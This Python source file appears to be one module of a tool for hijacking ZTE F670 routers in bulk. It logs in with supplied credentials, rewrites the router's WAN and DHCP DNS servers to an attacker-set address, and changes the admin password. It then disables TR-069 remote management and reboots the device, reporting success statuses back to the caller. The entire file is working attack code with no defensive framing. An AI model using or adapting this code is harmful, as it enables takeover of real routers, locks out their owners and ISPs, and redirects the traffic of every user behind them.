import re
from base64 import b64encode
from hashlib import sha256

import requests

from shared import *

def login(target):
    s = requests.Session()
    s.hooks = { 'response': lambda r, *args, **kwargs: r.raise_for_status() }
    s.headers.update({
        'User-Agent': random.choice(useragents),
        'Accept-Language': 'ru,en-US;q=0.7,en;q=0.3'
    })

    try:
        r = s.get(f'http://{target.ip}', timeout=TIMEOUT)
    except (requests.RequestException, IndexError):
        return Status.Inaccessible

    matchtoken = re.search(r'creatHiddenInput\("Frm_Logintoken", "(\d+)"\)', r.text)

    token = matchtoken.group(1) if matchtoken else ''

    if matchtoken is None:
        matchtoken = re.search(r'getObj\("Frm_Logintoken"\).value = "(.*)";', r.text)
    token = matchtoken.group(1) if matchtoken else ''

    matchcheck = re.search(r'creatHiddenInput\("Frm_Loginchecktoken", "(\d+)"\)', r.text)
    checktoken = matchcheck.group(1) if matchcheck else ''

    pwd_random = str(round(random.random()*89999999)+10000000)

    try:
        r = s.post(f'http://{target.ip}/', {
            'action': 'login',
            'Username': target.username,
            'Password': sha256(target.password.encode() + pwd_random.encode()).hexdigest(),
            'Frm_Logintoken': token,
            'UserRandomNum': pwd_random,
            'frashnum': '',
            'Frm_Loginchecktoken': checktoken,
        }, timeout=TIMEOUT)
    except requests.RequestException as ex:
        return Status.WrongAuth

    if '/start.ghtml' not in r.url:
        return Status.WrongAuth

    return s

def zte_F670(target):
    if isinstance(target, str):
        if (target := parse_target(target)) is None:
            return None

    s = login(target)
    if isinstance(s, Status):
        return s

    r = s.get(f'http://{target.ip}', timeout=TIMEOUT)
    manager = 'manager_aduser' if target.username == 'admin' else 'pon_manager_supuser'

    try:
        r = s.get(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', timeout=TIMEOUT)
        token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
        r = s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
            'DnsCMAPIEnabled': 'NULL',
            'DomainName': 'NULL',
            'SerIPAddress1': NEWDNS,
            'SerIPAddress2': '0.0.0.0',
            'SerIPAddress3': 'NULL',
            'SerIPAddress4': 'NULL',
            'SerIPAddress5': 'NULL',
            'SerIPv6Address1': '::',
            'SerIPv6Address2': '::',
            'SerIPv6Address3': 'NULL',
            'SerIPv6Address4': 'NULL',
            'SerIPv6Address5': 'NULL',
            'IF_ACTION': 'apply',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            '_SESSION_TOKEN': token
        }, timeout=TIMEOUT)

        r = s.get(f'http://{target.ip}/getpage.gch?pid=1002&nextpage={manager}_conf_t.gch', timeout=TIMEOUT)
        token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
        matchlogin = re.search('var login_random = (\d+)', r.text)
        login_random = matchlogin.group(1) if matchlogin else ''

        r = s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage={manager}_conf_t.gch', {
            'Username': target.username,
            'OldPassword': sha256(target.password.encode() + login_random.encode()).hexdigest(),
            'Password': b64encode(NEWPASS.encode()).decode(),
            'IF_ACTION': 'apply',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            'IF_PAGE': '',
            '_SESSION_TOKEN': token
        }, timeout=TIMEOUT)
        target.password = NEWPASS
        s = login(target)
        if isinstance(s, Status):
            return s

        try:
            r = s.get(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', timeout=TIMEOUT)
            token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
            s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
                'Tr069Enable': '0',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
                'IF_PAGE': '',
                '_SESSION_TOKEN': token
            }, timeout=TIMEOUT)
        except Exception as ex:
            s = login(target)
            if isinstance(s, Status):
                return s

        try:
            r = s.get(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', timeout=TIMEOUT)
            token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
            s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
                'DNSServer1': NEWDNS,
                'DNSServer2': '',
                'DNSServer3': '',
                'DnsServerSource': '0',
                'ISPDnsServerSource': 'NULL',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
                'IF_PAGE': '',
                '_SESSION_TOKEN': token
            }, timeout=TIMEOUT)
        except Exception as ex:
            s = login(target)
            if isinstance(s, Status):
                return s

    except requests.RequestException as ex:
        return Status.PartialSuccess

    try:
        r = s.get(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', timeout=TIMEOUT)

        token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
        r = s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
            'IF_ACTION': 'devrestart',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            'IF_PAGE': '',
            'flag': '1',
            '_SESSION_TOKEN': token
        }, timeout=TIMEOUT)

    except requests.exceptions.ReadTimeout:
        return Status.Success
    except requests.RequestException:
        pass

    return Status.PartialSuccess
